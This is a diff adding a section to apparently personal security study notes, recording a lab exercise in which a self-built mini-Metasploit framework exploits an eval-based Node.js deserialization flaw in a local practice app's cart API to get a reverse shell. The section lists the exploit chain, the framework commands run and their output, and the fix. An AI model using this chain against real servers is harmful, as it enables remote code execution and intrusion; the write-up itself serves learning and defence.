@@ -1175,3 +1175,50 @@ Got a real shell (u0_a333).
 - 8.10 (Secure API) — auth is not enough if the code is vulnerable.
 - 7.5.2 (Threads) — the handler uses threads.
 - 7.5 (Networking) — sockets and ports.
+## 12.14 Exploitation Basics (Mini-MSF) — Phase B DONE ✅
+
+Used my custom mini-msf framework to exploit pos-lab.
+Successfully got a reverse shell and executed commands.
+
+### The exploit chain
+1. Module: `node_js_inject`
+2. Login to pos-lab (cookie extraction)
+3. Send malicious JSON to `/api/cart/restore`
+4. Server evals the payload (`_$$ND_FUNC$$_`)
+5. Python reverse shell connects back to port 4444
+6. Handler catches Session 1
+7. `whoami` returns `u0_a333`
+
+### Real commands I ran
+- `use node_js_inject`
+- `set RHOST 127.0.0.1`, `set RPORT 3001`, `set LHOST 127.0.0.1`, `set LPORT 4444`
+- `run`
+- `sessions -l`
+- `sessions -i 1`
+- `whoami` (inside the shell)
+
+### Things I saw
+- `[+] logged in as boss`
+- `{"ok":true,"cart":["SENT"]}`
+- `[+] Session 1 opened`
+- `u0_a333` (from whoami)
+- The shell was interactive.
+
+### My own words (locked in)
+- Metasploit is just a framework. I built a mini version.
+- The handler catches the shell.
+- The exploit delivers the payload.
+- `eval()` is dangerous.
+- `os.dup2` redirects stdio to the socket.
+- I now understand the real Metasploit workflow: use, set, run, sessions.
+- Typing `LHOSR` instead of `LHOST` showed me how important it is to read options.
+- The shell output is messy (raw sockets), but the commands work.
+- I can write files to the victim (`echo` > `/tmp/pwned.txt`).
+
+### Connection to other topics
+- 12.13 (Vuln Assessment) — found the `eval()` bug.
+- 12.15 (Web Hacking) — the bug was in the cart API.
+- 8.4 (Secure Coding) — fix: never use `eval()` on user input.
+- 7.5.2 (Threads) — the handler uses threads.
+- 7.5 (Networking) — sockets, ports, reverse shells.
+- Part 8 (Security) — defense: WAF, CSP, input validation.
